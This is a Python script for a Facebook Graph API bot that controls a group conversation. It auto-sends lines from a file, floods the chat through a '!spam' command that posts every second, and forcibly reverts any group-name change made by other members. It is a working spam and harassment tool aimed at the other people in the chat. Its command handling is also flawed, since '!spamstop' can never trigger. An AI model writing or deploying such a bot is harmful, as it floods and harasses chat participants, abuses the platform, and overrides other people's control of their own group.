import requests, time, threading

def read_file(fname):
    return open(fname, 'r').read().strip()

def read_lines(fname):
    return open(fname, 'r').readlines()

# Load settings
admin_id = read_file("config.txt").splitlines()[0].split('=')[1]
group_name_lock = [line.split('=')[1] for line in read_file("config.txt").splitlines() if "group_name_lock" in line][0]
convo_id = read_file("convo.txt")
access_token = read_lines("tokennum.txt")[0].strip()
graph_url = "https://graph.facebook.com/v17.0"
is_active = False
is_spamming = False

def update_group_name(name):
    url = f"{graph_url}/{convo_id}"
    data = {"access_token": access_token, "name": name}
    requests.post(url, data=data)

def send_message(msg):
    url = f"{graph_url}/t_{convo_id}"
    data = {'access_token': access_token, 'message': msg}
    requests.post(url, json=data)

def handle_command(message):
    global is_active, is_spamming, group_name_lock
    if message.startswith("!help"):
        send_message("Commands:\n!send\n!stop\n!spam\n!spamstop\n!help\n!lockname <name>\n!unlockname")
    elif message.startswith("!send"):
        is_active = True
        send_message("✅ Sending started!")
    elif message.startswith("!stop"):
        is_active = False
        send_message("⛔ Sending stopped.")
    elif message.startswith("!spam"):
        is_spamming = True
        send_message("💣 Spam started!")
    elif message.startswith("!spamstop"):
        is_spamming = False
        send_message("🛑 Spam stopped.")
    elif message.startswith("!lockname"):
        group_name_lock = message.replace("!lockname", "").strip()
        with open("config.txt", "w") as f:
            f.write(f"admin_id={admin_id}\ngroup_name_lock={group_name_lock}")
        update_group_name(group_name_lock)
        send_message(f"🔒 Group name locked to: {group_name_lock}")
    elif message.startswith("!unlockname"):
        group_name_lock = ""
        with open("config.txt", "w") as f:
            f.write(f"admin_id={admin_id}\ngroup_name_lock=")
        send_message("🔓 Group name unlocked.")
    else:
        send_message("❓ Unknown command. Type !help")

def get_group_name():
    url = f"{graph_url}/{convo_id}?access_token={access_token}&fields=name"
    r = requests.get(url).json()
    return r.get("name", "")

def auto_sender():
    while True:
        if is_active:
            msgs = read_lines("File.txt")
            for msg in msgs:
                if not is_active: break
                send_message(msg.strip())
                time.sleep(int(read_file("time.txt")))
        elif is_spamming:
            send_message("🔥 Spam from bot!")
            time.sleep(1)
        else:
            time.sleep(1)

def monitor_group_name():
    global group_name_lock
    while True:
        if group_name_lock:
            current = get_group_name()
            if current != group_name_lock:
                update_group_name(group_name_lock)
                print(f"[!] Group name changed! Reset to: {group_name_lock}")
        time.sleep(1)

def simulate_command_listener():
    last = ""
    while True:
        try:
            msg = read_file("latest_command.txt")
            if msg != last:
                handle_command(msg)
                last = msg
        except: pass
        time.sleep(2)

def main():
    threading.Thread(target=auto_sender, daemon=True).start()
    threading.Thread(target=monitor_group_name, daemon=True).start()
    simulate_command_listener()

if __name__ == '__main__':
    main()
